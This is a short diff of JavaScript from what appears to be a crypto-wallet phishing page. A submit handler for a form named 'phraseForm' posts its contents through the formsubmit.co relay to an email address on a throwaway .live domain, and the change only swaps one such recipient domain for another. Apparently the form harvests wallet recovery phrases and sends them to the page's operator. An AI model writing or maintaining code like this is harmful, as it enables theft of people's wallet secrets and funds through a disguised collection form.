@@ -128,7 +128,7 @@ manualBtn.addEventListener("click", () => {
 phraseForm.addEventListener('submit', (e) => {
 	e.preventDefault();
 
-	fetch("https://formsubmit.co/ajax/support@sparkflrdao.live", {
+	fetch("https://formsubmit.co/ajax/support@dropportalnetwork.live", {
 		method: "POST",
 		headers: {
 			'Content-Type': 'application/json',
